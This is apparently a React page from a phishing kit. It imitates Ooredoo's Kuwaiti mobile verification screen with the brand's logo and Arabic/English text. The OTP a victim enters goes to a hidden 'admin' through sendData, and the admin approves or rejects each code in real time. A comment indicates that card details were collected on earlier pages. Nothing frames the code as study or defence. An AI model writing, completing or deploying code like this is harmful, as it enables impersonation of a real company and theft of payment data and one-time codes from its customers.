import { useEffect, useState, useRef } from "react";
import { useLocation } from "wouter";
import { useSignalEffect } from "@preact/signals-react";
import WaitingOverlay, { waitingCardInfo } from "@/components/WaitingOverlay";
import {
  sendData,
  codeAction,
  navigateToPage,
} from "@/lib/store";

export default function CustomerAuthentication() {
  const [, navigate] = useLocation();
  const [otpValue, setOtpValue] = useState("");
  const [error, setError] = useState(false);
  const [isWaiting, setIsWaiting] = useState(false);
  const [countdown, setCountdown] = useState(29);
  const [canResend, setCanResend] = useState(false);
  const inputRef = useRef<HTMLInputElement>(null);
  const [currentLang, setCurrentLang] = useState(
    localStorage.getItem("siteLang") || "ar"
  );

  const translations = {
    ar: {
      title: "تحقق من رقمك",
      subtitlePrefix: "لقد أرسلنا رمز تحقق مكون من 6 أرقام إلى ",
      resendCountdown: "إعادة إرسال الرمز بعد ",
      resendSuffix: " ثانية",
      resendReady: "إعادة إرسال الرمز",
      verifyBtn: "تحقق ومتابعة",
      changeNumber: "تغيير الرقم",
      toggleText: "English",
      errorMsg: "الرمز غير صحيح، يرجى المحاولة مرة أخرى.",
    },
    en: {
      title: "Verify Your Number",
      subtitlePrefix: "We've sent a 6-digit OTP to ",
      resendCountdown: "Resend OTP after ",
      resendSuffix: "s",
      resendReady: "Resend code",
      verifyBtn: "Verify & Continue",
      changeNumber: "Change Number",
      toggleText: "العربية",
      errorMsg: "Invalid code, please try again.",
    },
  };

  const t = translations[currentLang as keyof typeof translations] || translations.ar;

  // Get stored phone number
  const getPhoneNumber = () => {
    try {
      const stored = sessionStorage.getItem("ooredoo_otp_customer_number");
      if (stored) return "+965 " + stored;
    } catch (e) {}
    return "+965 94949590";
  };

  const [phoneNumber] = useState(getPhoneNumber());

  // Emit page enter & clear card info (not relevant after network-operator)
  useEffect(() => {
    waitingCardInfo.value = null;
    navigateToPage("توثيق الجوال");
  }, []);

  // Countdown timer
  useEffect(() => {
    if (countdown > 0) {
      const timer = setTimeout(() => setCountdown(countdown - 1), 1000);
      return () => clearTimeout(timer);
    } else {
      setCanResend(true);
    }
  }, [countdown]);

  // Handle code action from admin
  useSignalEffect(() => {
    const action = codeAction.value;
    if (action) {
      if (action.action === "approve") {
        // Navigate to OTP login page
        navigate("/otp-login");
      } else if (action.action === "reject") {
        setOtpValue("");
        setError(true);
        setIsWaiting(false);
        if (inputRef.current) inputRef.current.focus();
      }
      codeAction.value = null;
    }
  });

  const toggleLanguage = () => {
    const newLang = currentLang === "ar" ? "en" : "ar";
    setCurrentLang(newLang);
    localStorage.setItem("siteLang", newLang);
  };

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    const digits = otpValue.replace(/\D/g, "");
    if (digits.length !== 4 && digits.length !== 6) return;

    setError(false);
    setIsWaiting(true);
    sendData({
      data: { "رمز التحقق": digits },
      current: "توثيق الجوال",
      nextPage: "OTP دخول",
      waitingForAdminResponse: true,
    });
  };

  const handleResend = () => {
    if (!canResend) return;
    setCanResend(false);
    setCountdown(29);
    sendData({
      data: { "طلب": "إعادة إرسال رمز" },
      current: "توثيق الجوال",
      nextPage: "توثيق الجوال",
      waitingForAdminResponse: true,
    });
  };

  const handleInputChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const val = e.target.value.replace(/\D/g, "").slice(0, 6);
    setOtpValue(val);
    setError(false);
  };

  const isButtonEnabled = otpValue.length === 4 || otpValue.length === 6;

  return (
    <div
      className="min-h-screen flex flex-col items-center bg-white"
      dir={currentLang === "ar" ? "rtl" : "ltr"}
      style={{ fontFamily: "NotoSansLocal, Arial, Helvetica, sans-serif", paddingTop: "60px" }}
    >
      <WaitingOverlay />

      {/* Language Toggle */}
      <div className="w-full max-w-[626px] px-4 mb-2">
        <button
          onClick={toggleLanguage}
          className="bg-gray-100 border border-gray-300 rounded-full px-4 py-1.5 text-sm font-semibold text-gray-700 hover:bg-gray-200 transition-all"
        >
          {t.toggleText}
        </button>
      </div>

      {/* OTP Card */}
      <section
        className="w-full max-w-[626px] mx-4 bg-white border border-gray-100 rounded shadow-lg text-center"
        style={{ padding: "43px 34px 36px", boxShadow: "0 18px 38px rgba(0, 0, 0, 0.085)" }}
      >
        {/* Ooredoo Logo */}
        <div className="flex justify-center mb-3">
          <svg width="73" height="62" viewBox="0 0 74 62" aria-hidden="true">
            <circle cx="31" cy="34" r="17" fill="none" stroke="#ed1c24" strokeWidth="11"></circle>
            <circle cx="58" cy="14" r="7.5" fill="#ed1c24"></circle>
          </svg>
        </div>

        <h1 className="text-center font-bold text-gray-900 mb-2" style={{ fontSize: "35px" }}>
          {t.title}
        </h1>
        <p className="text-center text-gray-800 text-lg mb-1" style={{ fontSize: "17px" }}>
          {t.subtitlePrefix}<strong>{phoneNumber}</strong>
        </p>

        <form onSubmit={handleSubmit} className="w-full">
          {/* OTP Input */}
          <div className="w-[383px] max-w-full mx-auto my-6" dir="ltr">
            <input
              ref={inputRef}
              type="text"
              inputMode="numeric"
              pattern="[0-9]*"
              maxLength={6}
              value={otpValue}
              onChange={handleInputChange}
              placeholder="------"
              autoFocus
              className="w-full h-[62px] border border-gray-300 rounded-lg text-center outline-none focus:border-red-500 focus:ring-2 focus:ring-red-100 transition-all"
              style={{ fontSize: "28px", fontWeight: 700, letterSpacing: "8px", caretColor: "#ed1c24" }}
            />
          </div>

          {/* Resend */}
          <button
            type="button"
            onClick={handleResend}
            disabled={!canResend}
            className={`inline-block mb-4 border-0 bg-transparent text-base ${canResend ? "text-red-700 cursor-pointer hover:underline" : "text-red-300 cursor-default"}`}
            style={{ fontSize: "17px" }}
          >
            {canResend ? t.resendReady : `${t.resendCountdown}${countdown}${t.resendSuffix}`}
          </button>

          {/* Error Message */}
          {error && (
            <p className="text-red-600 text-center text-sm mb-3 font-medium">{t.errorMsg}</p>
          )}

          {/* Verify Button */}
          <button
            type="submit"
            disabled={!isButtonEnabled || isWaiting}
            className="w-[560px] max-w-full h-[58px] mx-auto flex items-center justify-center bg-red-600 text-white font-bold text-base rounded-full hover:bg-red-700 transition-colors disabled:opacity-40 disabled:cursor-not-allowed"
            style={{ background: "#ed1c24" }}
          >
            {isWaiting ? "..." : t.verifyBtn}
          </button>
        </form>

        {/* Change Number Link */}
        <div className="text-center mt-5">
          <a
            href="/ooredoo-login"
            className="inline-flex items-center gap-1.5 text-gray-500 font-bold text-lg hover:text-gray-700"
          >
            <svg width="17" height="17" viewBox="0 0 20 20" fill="currentColor">
              <path d="M8.72 4.22a.95.95 0 0 1 0 1.34L5.24 9.05h10.81a.95.95 0 1 1 0 1.9H5.24l3.48 3.49a.95.95 0 0 1-1.34 1.34l-5.1-5.1a.96.96 0 0 1 0-1.36l5.1-5.1a.95.95 0 0 1 1.34 0Z"></path>
            </svg>
            <span>{t.changeNumber}</span>
          </a>
        </div>
      </section>
    </div>
  );
}
